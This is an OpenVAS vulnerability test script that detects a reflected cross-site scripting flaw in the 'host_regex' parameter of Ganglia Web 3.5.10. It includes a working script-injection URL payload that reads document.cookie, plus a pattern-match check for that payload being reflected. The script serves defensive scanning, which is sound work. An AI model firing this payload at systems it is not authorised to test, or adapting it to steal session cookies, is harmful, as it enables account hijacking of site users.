###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ganglia_web_host_regex_xss_vuln.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# Ganglia Web 'host_regex' Cross Site Scripting Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:ganglia:ganglia-web";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803786");
  script_version("$Revision: 11865 $");
  script_cve_id("CVE-2013-6395");
  script_bugtraq_id(63921);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-12-18 15:34:41 +0530 (Wed, 18 Dec 2013)");
  script_name("Ganglia Web 'host_regex' Cross Site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_ganglia_detect.nasl");
  script_mandatory_keys("ganglia/installed");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://secunia.com/advisories/55854");
  script_xref(name:"URL", value:"http://seclists.org/oss-sec/2013/q4/346");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/89272");
  script_xref(name:"URL", value:"http://www.rusty-ice.de/advisory/advisory_2013002.txt");

  script_tag(name:"summary", value:"The host is installed with Ganglia Web and is prone to cross site scripting
  vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able
  read the cookie or not.");
  script_tag(name:"solution", value:"Upgrade to Ganglia Web version 3.5.11 or later.");
  script_tag(name:"insight", value:"Input passed via the 'host_regex' GET parameter to index.php (when 'c' is set
  to to '1') is not properly sanitised before being returned to the user.");
  script_tag(name:"affected", value:"Ganglia Web version 3.5.10 Other versions may also be affected.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary HTML
  and script code in a users browser session in context of an affected site and
  launch other attacks.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"http://ganglia.info/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = dir + "/?r=custom&cs=1&ce=1&s=by+name&c=1&h=&host_regex='><script>" +
            "alert(document.cookie)</script>&max_graphs=0&tab=m&vn=&hid" +
            "e-hf=false&sh=1&z=small&hc=0";

if( http_vuln_check( port:port, url:url, check_header:TRUE,
    pattern:"host_regex value=''><script>alert\(document.cookie\)</script>",
    extra_check:">Ganglia" ) ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );